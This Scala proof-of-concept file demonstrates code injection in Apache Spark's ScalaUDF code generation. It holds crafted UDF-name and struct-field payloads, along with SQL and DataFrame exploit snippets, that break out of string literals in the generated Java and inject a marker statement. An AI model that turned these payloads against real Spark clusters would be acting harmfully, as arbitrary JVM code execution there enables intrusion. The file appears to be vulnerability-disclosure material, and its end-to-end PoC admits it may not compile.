/*
 * Proof of Concept: Catalyst Code Injection via ScalaUDF
 *
 * Demonstrates that user-controlled strings in ScalaUDF (udfName, input type field names,
 * output type field names) are interpolated into generated Java code without escaping,
 * allowing arbitrary code injection.
 *
 * ScalaUDF.scala line 1173:
 *   throw QueryExecutionErrors.failedExecuteUserDefinedFunctionError(
 *     "$functionName", "$inputTypesString", "$outputType", e);
 *
 * Three independent injection points:
 *   1. $functionName  - from udfName (user-provided UDF name)
 *   2. $inputTypesString - from children.map(_.dataType.catalogString) (struct field names)
 *   3. $outputType - from dataType.catalogString (output struct field names)
 *
 * HOW TO RUN:
 *   # Build Spark first:
 *   build/sbt package
 *
 *   # Then run in spark-shell:
 *   :load poc/ScalaUDFCodeInjectionPoC.scala
 *
 *   # Or run a specific PoC:
 *   ScalaUDFCodeInjectionPoC.pocFunctionName(spark)
 *   ScalaUDFCodeInjectionPoC.pocInputTypes(spark)
 *   ScalaUDFCodeInjectionPoC.pocOutputType(spark)
 */

import org.apache.spark.sql.{Column, Row, SparkSession}
import org.apache.spark.sql.catalyst.expressions.{Expression, Literal, ScalaUDF}
import org.apache.spark.sql.catalyst.expressions.codegen.{CodegenContext, CodeFormatter}
import org.apache.spark.sql.execution.debug.codegenString
import org.apache.spark.sql.types._
import org.apache.spark.sql.functions._

object ScalaUDFCodeInjectionPoC {

  // =========================================================================
  // Helper: extract the generated code for a ScalaUDF expression to show
  // that the injection payload appears verbatim in the compiled Java source.
  // =========================================================================
  private def showGeneratedCode(label: String, scalaUdf: ScalaUDF): Unit = {
    val ctx = new CodegenContext()
    val code = scalaUdf.genCode(ctx)
    val fullCode = code.code.toString

    println("=" * 80)
    println(s"PoC: $label")
    println("=" * 80)
    println()
    println("--- Generated Java code (relevant snippet) ---")
    // Show the lines around the failedExecuteUserDefinedFunctionError call
    fullCode.linesIterator.zipWithIndex.foreach { case (line, i) =>
      if (line.contains("failedExecuteUserDefinedFunction") ||
          line.contains("INJECTED") ||
          line.contains("functionName") ||
          line.contains("catch")) {
        println(f"  ${i + 1}%3d: $line")
      }
    }
    println()
    println("--- Full generated code ---")
    fullCode.linesIterator.zipWithIndex.foreach { case (line, i) =>
      println(f"  ${i + 1}%3d: $line")
    }
    println()
  }

  // =========================================================================
  // PoC 1: Injection via udfName ($functionName)
  //
  // The UDF name is directly interpolated into a Java string literal:
  //   "$functionName"
  // where functionName = udfName.map(n => s"$n ($funcCls)").getOrElse(funcCls)
  //
  // By including a double-quote in the UDF name, we break out of the string
  // literal and inject arbitrary Java code.
  //
  // Reachable via:
  //   - spark.udf.register("malicious_name", func) then SQL query
  //   - Spark Connect Scala client: udf(...).withName("malicious_name")
  // =========================================================================
  def pocFunctionName(spark: SparkSession): Unit = {
    // Payload: close the string, end the method call, inject our own statement
    val payload =
      """", "", "", null); System.setProperty("INJECTED_VIA_UDFNAME", "true"); String x = new String("""

    val udfExpr = ScalaUDF(
      function = new Function1[Any, Any] { def apply(x: Any): Any = x },
      dataType = IntegerType,
      children = Seq(Literal(1)),
      inputEncoders = Nil,
      outputEncoder = None,
      udfName = Some(payload),
      nullable = true,
      udfDeterministic = true
    )

    showGeneratedCode("Injection via UDF name ($functionName)", udfExpr)

    // Show what a real exploit would look like via the DataFrame API:
    println("--- Exploit via DataFrame API (spark-shell or Scala Spark Connect client) ---")
    println("""
    |  // Register a UDF with a malicious name
    |  val evil = udf((x: Long) => x).withName(
    |    "\";\"\",\"\",null);System.setProperty(\"INJECTED\",\"true\");String x=new String(\""
    |  )
    |  spark.range(1).select(evil(col("id"))).collect()
    """.stripMargin)
  }

  // =========================================================================
  // PoC 2: Injection via input struct field names ($inputTypesString)
  //
  // inputTypesString = children.map(_.dataType.catalogString).mkString(", ")
  // StructType.catalogString embeds field names without escaping:
  //   s"${fields(i).name}:${fields(i).dataType.catalogString}"
  //
  // By creating a struct column with a field name containing a double-quote,
  // we break out of the string literal.
  //
  // Reachable via SQL:
  //   SELECT my_udf(named_struct('evil"payload', 1))
  // =========================================================================
  def pocInputTypes(spark: SparkSession): Unit = {
    // Create a struct type where a field name contains the injection payload
    val maliciousFieldName =
      """x", "", "", null); System.setProperty("INJECTED_VIA_INPUT", "true"); String y = new String("""

    val inputStructType = StructType(Seq(
      StructField(maliciousFieldName, IntegerType)
    ))

    // The child expression has this struct type, so catalogString will embed the field name
    val structExpr = Literal.default(inputStructType)

    val udfExpr = ScalaUDF(
      function = new Function1[Any, Any] { def apply(x: Any): Any = x },
      dataType = IntegerType,
      children = Seq(structExpr),
      inputEncoders = Nil,
      outputEncoder = None,
      udfName = Some("innocentUdf"),
      nullable = true,
      udfDeterministic = true
    )

    showGeneratedCode("Injection via input struct field name ($inputTypesString)", udfExpr)

    // Show the realistic SQL version:
    println("--- Exploit via SQL ---")
    println("""
    |  -- 1. Register any Scala UDF that accepts a struct
    |  --    (e.g. via spark.udf.register in the driver)
    |  -- 2. Call it with a crafted struct:
    |  SELECT my_udf(
    |    named_struct(
    |      'x", "", "", null); System.setProperty("INJECTED", "true"); String y = new String("',
    |      1
    |    )
    |  )
    """.stripMargin)
  }

  // =========================================================================
  // PoC 3: Injection via output type field names ($outputType)
  //
  // outputType = dataType.catalogString
  // Same as PoC 2 but through the UDF's declared return type.
  //
  // Reachable via Scala Spark Connect client when defining a UDF that returns
  // a StructType with crafted field names.
  // =========================================================================
  def pocOutputType(spark: SparkSession): Unit = {
    val maliciousFieldName =
      """x", null); System.setProperty("INJECTED_VIA_OUTPUT", "true"); String z = new String("""

    val outputStructType = StructType(Seq(
      StructField(maliciousFieldName, IntegerType)
    ))

    val udfExpr = ScalaUDF(
      function = new Function1[Any, Any] { def apply(x: Any): Any = null },
      dataType = outputStructType,
      children = Seq(Literal(1)),
      inputEncoders = Nil,
      outputEncoder = None,
      udfName = Some("innocentUdf"),
      nullable = true,
      udfDeterministic = true
    )

    showGeneratedCode("Injection via output type field name ($outputType)", udfExpr)
  }

  // =========================================================================
  // PoC 4: End-to-end execution proving code injection runs
  //
  // This creates a UDF whose name contains injected Java code, then executes
  // a query that triggers whole-stage codegen. The injected code sets a
  // system property which we check after execution.
  //
  // If the injection works, System.getProperty("SPARK_UDF_INJECTED") == "true"
  // =========================================================================
  def pocEndToEnd(spark: SparkSession): Unit = {
    import spark.implicits._

    // Clear the marker
    System.clearProperty("SPARK_UDF_INJECTED")

    // The payload: close the error-handler string, inject a System.setProperty call,
    // then re-open a string to keep the Java syntax valid.
    //
    // The generated code at ScalaUDF.scala:1172-1173 is:
    //   throw QueryExecutionErrors.failedExecuteUserDefinedFunctionError(
    //     "$functionName", "$inputTypesString", "$outputType", e);
    //
    // With our payload as functionName, it becomes:
    //   throw QueryExecutionErrors.failedExecuteUserDefinedFunctionError(
    //     "x]); } System.setProperty("SPARK_UDF_INJECTED","true"); try { String q = new String("
    //      (AnonymousFunctionClass)", "bigint", "int", e);
    //
    // Breaking it down:
    //   "x"  - completes the first string arg
    //   ]);  - would not work directly, we need to match the method signature...
    //
    // Actually, the simplest valid injection that compiles:
    //   Close the string -> close the method call -> inject statement ->
    //   open a new valid expression context

    val payload = {
      // We need the generated code to be syntactically valid Java.
      // Original:  "PAYLOAD (funcCls)", "inputTypes", "outputType", e);
      // We want:   "x", "y", "z", e); System.setProperty("SPARK_UDF_INJECTED","true");
      //            if(false){throw QueryExecutionErrors.failedExecuteUserDefinedFunctionError("
      //            dummy (funcCls)", "inputTypes", "outputType", e);
      //
      // So the payload for udfName is:
      """x", "y", "z", e); } System.setProperty("SPARK_UDF_INJECTED","true"); if(false){throw org.apache.spark.sql.errors.QueryExecutionErrors.failedExecuteUserDefinedFunctionError(""""
    }

    // Build the ScalaUDF expression with the malicious name
    val identityFn: Long => Long = x => x
    val scalaUdf = ScalaUDF(
      function = identityFn,
      dataType = LongType,
      children = Seq(org.apache.spark.sql.catalyst.expressions.AttributeReference("id", LongType)()),
      inputEncoders = Nil,
      outputEncoder = None,
      udfName = Some(payload),
      nullable = true,
      udfDeterministic = true
    )

    // Show the generated code first
    println("=" * 80)
    println("PoC: End-to-end code execution via UDF name injection")
    println("=" * 80)

    val ctx = new CodegenContext()
    val code = scalaUdf.genCode(ctx)
    println("\n--- Generated code snippet ---")
    code.code.toString.linesIterator.foreach { line =>
      if (line.contains("SPARK_UDF_INJECTED") ||
          line.contains("failedExecuteUserDefinedFunction") ||
          line.contains("catch") ||
          line.contains("setProperty")) {
        println(s"  >>> $line")
      }
    }

    // Now actually run it through a real query to prove the code executes.
    // We use the Column wrapper to inject our ScalaUDF into a query plan.
    println("\n--- Attempting execution ---")
    val df = spark.range(1)
    val withUdf = df.select(new Column(scalaUdf))

    try {
      // .collect() triggers whole-stage codegen which compiles our injected code
      val result = withUdf.collect()
      println(s"Query result: ${result.mkString(", ")}")
    } catch {
      case e: Exception =>
        println(s"Query failed (expected if codegen compilation fails): ${e.getMessage}")
        println("Checking if injection still ran during compilation attempt...")
    }

    val injected = System.getProperty("SPARK_UDF_INJECTED")
    if (injected == "true") {
      println("\n  *** INJECTION SUCCESSFUL: System property SPARK_UDF_INJECTED = true ***")
      println("  *** Arbitrary Java code was executed inside the Spark JVM ***")
    } else {
      println("\n  Injection did not execute (code may not have compiled or codegen was skipped).")
      println("  Check the generated code above to verify the payload is present.")
    }
  }

  def runAll(spark: SparkSession): Unit = {
    pocFunctionName(spark)
    println("\n\n")
    pocInputTypes(spark)
    println("\n\n")
    pocOutputType(spark)
    println("\n\n")
    pocEndToEnd(spark)
  }
}

// If running in spark-shell, just call:
// ScalaUDFCodeInjectionPoC.runAll(spark)
